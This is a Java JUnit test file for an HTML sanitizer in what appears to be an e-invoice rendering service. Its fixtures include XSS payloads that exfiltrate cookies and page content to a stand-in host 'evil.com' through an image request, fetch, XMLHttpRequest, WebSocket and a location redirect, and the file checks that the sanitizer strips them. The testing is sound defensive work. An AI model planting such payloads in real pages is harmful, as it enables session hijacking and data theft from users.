package io.mersel.services.xslt.infrastructure;

import io.mersel.services.xslt.application.models.SanitizationResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("HtmlSanitizer")
class HtmlSanitizerTest {

    private HtmlSanitizer sanitizer;

    @BeforeEach
    void setUp() {
        sanitizer = new HtmlSanitizer();
    }

    // ── Boş / null girdi ──────────────────────────────────────────────

    @Test
    @DisplayName("null girdi için boş sonuç dönmeli")
    void shouldReturnEmptyResultForNullInput() {
        SanitizationResult result = sanitizer.sanitize(null);
        assertThat(result.sanitizedHtml()).isNull();
        assertThat(result.allowedScriptHashes()).isEmpty();
        assertThat(result.removedScriptCount()).isZero();
    }

    @Test
    @DisplayName("Boş byte dizisi için boş sonuç dönmeli")
    void shouldReturnEmptyResultForEmptyInput() {
        SanitizationResult result = sanitizer.sanitize(new byte[0]);
        assertThat(result.sanitizedHtml()).isEmpty();
        assertThat(result.allowedScriptHashes()).isEmpty();
    }

    // ── Tehlikeli tag temizliği ────────────────────────────────────────

    @Nested
    @DisplayName("Tehlikeli Tag Temizliği")
    class DangerousTagRemoval {

        @Test
        @DisplayName("iframe tag kaldırılmalı")
        void shouldRemoveIframeTag() {
            String html = "<html><body><iframe src=\"https://evil.com\"></iframe><p>İçerik</p></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("<iframe");
            assertThat(output).contains("<p>İçerik</p>");
        }

        @Test
        @DisplayName("object ve embed tag'ları kaldırılmalı")
        void shouldRemoveObjectAndEmbedTags() {
            String html = "<html><body><object data=\"x.swf\"></object><embed src=\"y.swf\"></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("<object");
            assertThat(output).doesNotContain("<embed");
        }

        @Test
        @DisplayName("base tag kaldırılmalı")
        void shouldRemoveBaseTag() {
            String html = "<html><head><base href=\"https://evil.com/\"></head><body></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("<base");
        }

        @Test
        @DisplayName("meta http-equiv=refresh kaldırılmalı")
        void shouldRemoveMetaRefresh() {
            String html = "<html><head><meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\"></head><body></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("http-equiv");
        }
    }

    // ── Event handler temizliği ────────────────────────────────────────

    @Nested
    @DisplayName("Event Handler Temizliği")
    class EventHandlerRemoval {

        @Test
        @DisplayName("onclick attribute kaldırılmalı")
        void shouldRemoveOnclick() {
            String html = "<html><body><div onclick=\"alert(1)\">Tıkla</div></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("onclick");
            assertThat(output).contains("Tıkla");
        }

        @Test
        @DisplayName("onerror attribute kaldırılmalı")
        void shouldRemoveOnerror() {
            String html = "<html><body><img src=\"x\" onerror=\"alert(document.cookie)\"></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("onerror");
        }

        @Test
        @DisplayName("onload attribute kaldırılmalı")
        void shouldRemoveOnload() {
            String html = "<html><body onload=\"steal()\"><p>Test</p></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("onload");
        }

        @Test
        @DisplayName("Birden fazla on* attribute kaldırılmalı")
        void shouldRemoveMultipleEventHandlers() {
            String html = "<html><body><div onclick=\"a()\" onmouseover=\"b()\" onkeypress=\"c()\">X</div></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("onclick");
            assertThat(output).doesNotContain("onmouseover");
            assertThat(output).doesNotContain("onkeypress");
        }
    }

    // ── JavaScript URL temizliği ──────────────────────────────────────

    @Nested
    @DisplayName("JavaScript URL Temizliği")
    class JavascriptUrlRemoval {

        @Test
        @DisplayName("javascript: href kaldırılmalı")
        void shouldRemoveJavascriptHref() {
            String html = "<html><body><a href=\"javascript:alert(1)\">Link</a></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("javascript:");
            assertThat(output).contains("Link");
        }

        @Test
        @DisplayName("vbscript: href kaldırılmalı")
        void shouldRemoveVbscriptHref() {
            String html = "<html><body><a href=\"vbscript:msgbox\">Link</a></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("vbscript:");
        }
    }

    // ── img src korunması ─────────────────────────────────────────────

    @Nested
    @DisplayName("img src Korunması")
    class ImgSrcPreservation {

        @Test
        @DisplayName("Base64 data URI'li img korunmalı")
        void shouldPreserveBase64Img() {
            String base64Src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==";
            String html = "<html><body><img src=\"" + base64Src + "\"></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).contains(base64Src);
        }

        @Test
        @DisplayName("Harici URL'li img korunmalı")
        void shouldPreserveExternalImg() {
            String html = "<html><body><img src=\"https://cdn.example.com/logo.png\"></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).contains("https://cdn.example.com/logo.png");
        }
    }

    // ── Script exfiltration analizi ───────────────────────────────────

    @Nested
    @DisplayName("Script Exfiltration Analizi")
    class ScriptExfiltrationAnalysis {

        @Test
        @DisplayName("QR kod scripti (canvas + toDataURL) izin verilmeli")
        void shouldAllowQrCodeScript() {
            String script = """
                    var canvas = document.createElement('canvas');
                    var ctx = canvas.getContext('2d');
                    ctx.fillRect(0, 0, 100, 100);
                    var img = document.getElementById('qrcode');
                    img.src = canvas.toDataURL();
                    """;
            String html = "<html><body><script>" + script + "</script><img id=\"qrcode\"></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(result.removedScriptCount()).isZero();
            assertThat(result.allowedScriptHashes()).hasSize(1);
            assertThat(output).contains("canvas");
        }

        @Test
        @DisplayName("document.cookie içeren script kaldırılmalı")
        void shouldRemoveCookieAccessScript() {
            String script = "var stolen = document.cookie; new Image().src='https://evil.com/?c='+stolen;";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.allowedScriptHashes()).isEmpty();
            assertThat(output).doesNotContain("document.cookie");
        }

        @Test
        @DisplayName("fetch() içeren script kaldırılmalı")
        void shouldRemoveFetchScript() {
            String script = "fetch('https://evil.com/steal', {method:'POST', body: document.body.innerHTML});";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.removalReasons()).anyMatch(r -> r.contains("fetch"));
        }

        @Test
        @DisplayName("XMLHttpRequest içeren script kaldırılmalı")
        void shouldRemoveXhrScript() {
            String script = "var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com'); xhr.send();";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
        }

        @Test
        @DisplayName("window.location içeren script kaldırılmalı")
        void shouldRemoveLocationRedirect() {
            String script = "window.location = 'https://evil.com/?data=' + document.body.innerHTML;";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
        }

        @Test
        @DisplayName("localStorage içeren script kaldırılmalı")
        void shouldRemoveLocalStorageAccess() {
            String script = "var token = localStorage.getItem('authToken');";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
        }

        @Test
        @DisplayName("eval() içeren script kaldırılmalı")
        void shouldRemoveEvalScript() {
            String script = "eval('alert(1)');";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
        }

        @Test
        @DisplayName("alert() içeren script kaldırılmalı")
        void shouldRemoveAlertScript() {
            String script = "alert('Merhaba Dünya');";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.removalReasons()).anyMatch(r -> r.contains("alert"));
        }

        @Test
        @DisplayName("confirm() içeren script kaldırılmalı")
        void shouldRemoveConfirmScript() {
            String script = "if (confirm('Emin misiniz?')) { doSomething(); }";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.removalReasons()).anyMatch(r -> r.contains("confirm"));
        }

        @Test
        @DisplayName("prompt() içeren script kaldırılmalı")
        void shouldRemovePromptScript() {
            String script = "var name = prompt('Adınız nedir?'); document.write(name);";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.removalReasons()).anyMatch(r -> r.contains("prompt"));
        }

        @Test
        @DisplayName("WebSocket içeren script kaldırılmalı")
        void shouldRemoveWebSocketScript() {
            String script = "var ws = new WebSocket('wss://evil.com'); ws.send(document.body.innerHTML);";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
        }

        @Test
        @DisplayName("Harici src attribute'lu script kaldırılmalı")
        void shouldRemoveExternalSrcScript() {
            String html = "<html><body><script src=\"https://evil.com/xss.js\"></script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.removalReasons()).anyMatch(r -> r.contains("Harici script"));
        }

        @Test
        @DisplayName("Boş script tag'i kaldırılmalı")
        void shouldRemoveEmptyScript() {
            String html = "<html><body><script></script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.allowedScriptHashes()).isEmpty();
        }

        @Test
        @DisplayName("innerHTML kullanan QR kütüphane scripti izin verilmeli (exfiltration API yok)")
        void shouldAllowInnerHtmlForQrLib() {
            String script = """
                    var container = document.getElementById('qr-container');
                    container.innerHTML = '<canvas id="qr"></canvas>';
                    var canvas = document.getElementById('qr');
                    var ctx = canvas.getContext('2d');
                    ctx.fillStyle = '#000';
                    ctx.fillRect(10, 10, 5, 5);
                    """;
            String html = "<html><body><script>" + script + "</script><div id=\"qr-container\"></div></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isZero();
            assertThat(result.allowedScriptHashes()).hasSize(1);
        }

        @Test
        @DisplayName("document.write kullanan eski XSLT scripti izin verilmeli")
        void shouldAllowDocumentWriteScript() {
            String script = "document.write('<table><tr><td>Fatura</td></tr></table>');";
            String html = "<html><body><script>" + script + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isZero();
            assertThat(result.allowedScriptHashes()).hasSize(1);
        }

        @Test
        @DisplayName("Birden fazla script — biri temiz, biri tehlikeli")
        void shouldHandleMixedScripts() {
            String safeScript = "var x = 1 + 2; document.getElementById('result').textContent = x;";
            String dangerousScript = "fetch('https://evil.com/steal?cookie=' + document.cookie);";
            String html = "<html><body><script>" + safeScript + "</script><script>" + dangerousScript + "</script></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));

            assertThat(result.removedScriptCount()).isEqualTo(1);
            assertThat(result.allowedScriptHashes()).hasSize(1);
        }
    }

    // ── SHA-256 Hash hesaplama ────────────────────────────────────────

    @Nested
    @DisplayName("Hash Hesaplama")
    class HashComputation {

        @Test
        @DisplayName("Aynı içerik aynı hash üretmeli")
        void shouldProduceSameHashForSameContent() {
            String content = "var x = 1;";
            String hash1 = HtmlSanitizer.computeSha256Base64(content);
            String hash2 = HtmlSanitizer.computeSha256Base64(content);

            assertThat(hash1).isEqualTo(hash2);
            assertThat(hash1).isNotEmpty();
        }

        @Test
        @DisplayName("Farklı içerik farklı hash üretmeli")
        void shouldProduceDifferentHashForDifferentContent() {
            String hash1 = HtmlSanitizer.computeSha256Base64("var x = 1;");
            String hash2 = HtmlSanitizer.computeSha256Base64("var x = 2;");

            assertThat(hash1).isNotEqualTo(hash2);
        }
    }

    // ── link tag temizliği ────────────────────────────────────────────

    @Nested
    @DisplayName("Link Tag Temizliği")
    class DangerousLinkRemoval {

        @Test
        @DisplayName("link rel=import kaldırılmalı")
        void shouldRemoveLinkImport() {
            String html = "<html><head><link rel=\"import\" href=\"evil.html\"></head><body></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("rel=\"import\"");
        }

        @Test
        @DisplayName("link rel=preload as=script kaldırılmalı")
        void shouldRemoveLinkPreloadScript() {
            String html = "<html><head><link rel=\"preload\" as=\"script\" href=\"evil.js\"></head><body></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).doesNotContain("preload");
        }

        @Test
        @DisplayName("Normal CSS link korunmalı")
        void shouldPreserveCssLink() {
            String html = "<html><head><link rel=\"stylesheet\" href=\"style.css\"></head><body></body></html>";
            SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
            String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

            assertThat(output).contains("stylesheet");
            assertThat(output).contains("style.css");
        }
    }

    // ── Gerçekçi e-Fatura senaryosu ───────────────────────────────────

    @Test
    @DisplayName("Gerçekçi e-Fatura HTML'i — QR kod scripti + normal içerik korunmalı")
    void shouldHandleRealisticInvoiceHtml() {
        String html = """
                <html>
                <head>
                    <style>body { font-family: Arial; }</style>
                </head>
                <body>
                    <h1>e-Fatura</h1>
                    <table>
                        <tr><td>Fatura No:</td><td>ABC2024000001</td></tr>
                        <tr><td>Tarih:</td><td>2024-01-15</td></tr>
                    </table>
                    <img id="qrcode" src="data:image/png;base64,iVBORw0KGgo=">
                    <script>
                        var canvas = document.createElement('canvas');
                        canvas.width = 200;
                        canvas.height = 200;
                        var ctx = canvas.getContext('2d');
                        ctx.fillStyle = '#000000';
                        for (var i = 0; i < 20; i++) {
                            for (var j = 0; j < 20; j++) {
                                if (Math.random() > 0.5) ctx.fillRect(i*10, j*10, 10, 10);
                            }
                        }
                        document.getElementById('qrcode').src = canvas.toDataURL('image/png');
                    </script>
                </body>
                </html>
                """;
        SanitizationResult result = sanitizer.sanitize(html.getBytes(StandardCharsets.UTF_8));
        String output = new String(result.sanitizedHtml(), StandardCharsets.UTF_8);

        assertThat(result.removedScriptCount()).isZero();
        assertThat(result.allowedScriptHashes()).hasSize(1);
        assertThat(output).contains("e-Fatura");
        assertThat(output).contains("ABC2024000001");
        assertThat(output).contains("data:image/png;base64");
        assertThat(output).contains("canvas");
    }
}
